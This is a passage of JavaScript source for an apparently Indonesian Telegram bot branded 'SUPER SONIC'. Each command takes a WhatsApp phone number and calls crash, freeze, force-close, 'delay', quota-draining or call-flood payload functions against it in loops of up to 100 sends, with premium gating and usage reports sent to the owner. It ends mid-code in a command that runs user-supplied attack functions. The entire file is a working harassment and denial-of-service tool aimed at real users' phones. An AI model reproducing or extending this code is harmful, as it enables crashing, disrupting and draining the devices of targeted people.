  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Stuck
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await UiCallCrashBlank(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Stuck
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashblank", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashblank  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Blank
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await Ramadhan(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Blank
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("combox", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /combox  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Combo Bug
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await Ramadhan(sock, target);
    await CtaZts(sock, target);
    await blankInfinity(sock, target);
    await CarouselVY4(sock, target);
    await CStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Combo Bug
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("fireblank", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /fireblank  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Infinity
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await blankInfinity(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Infinity
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("efceclick", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /efceclick  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close Click
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await CtaZts(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close Click
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("applefreeze", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /applefreeze  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Freeze Home Iphone
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await freezeIphone(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Freeze Home Iphone
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("applecrash", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /applecrash  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close Iphone
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await invsNewIos(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close Iphone
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("aquaticdelay", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /aquaticdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Bebas Spam
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await dileyflow(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Bebas Spam
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaymention", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaymention 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invisible Mention
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 19; i++) {
    await CStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invsble Mention
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delayv2", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayv2 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Anu Pokoknya
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await dileyflow(sock, target);
    await DelayBuldoo(sock, target);
    await delayBoom(target, ptcp = true);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Anu Pokoknya
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("/ghostdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: //ghostdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invisible Android
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await phantomStrike(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invisible Android
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("drainkouta", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drainkouta 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Sedot Kouta
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await nexabullquota(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Sedot Kouta
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("flowrdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /flowrdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Bebas Spam
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await nexanewdelay(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Bebas Spam
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("twinsdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /twinsdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Bebas Spam No Log ut
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await responsenexa(sock, target);
    await sleep(2000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Bebas Spam No Log ut
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delayduration", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayduration 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Hard Delay 1000%
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await DelayBuldoo(sock, target);
    await sleep(2000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Hard Delay 1000%
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashui", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Ui Andro
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await CarouselVY4(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Ui Andro
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashandroid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashandroid 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Freeze Home For Andro
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await nexanotifui(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Freeze Home For Andro
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("majesticdelay", checkWhatsAppConnection, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /majesticdelay 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(` SUCCES SEND BUG TO ${cleanNum}...`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 5; i++) {
    await Qivisix(sock, target);
    await glowInvis(sock, target);
    await Cycsi(sock, target);
    await sleep(10000);
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 majesticdelay dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("onemsg", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /onemsg 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close 1 Msg
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await executeCallFlood(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Force Close 1 Msg
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("flowerdly", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /flowerdly 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Infinity
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await delayBoom(target, ptcp = true);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡l
⌑ Target: ${q}
⌑ Type: Delay Hard Infinity
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
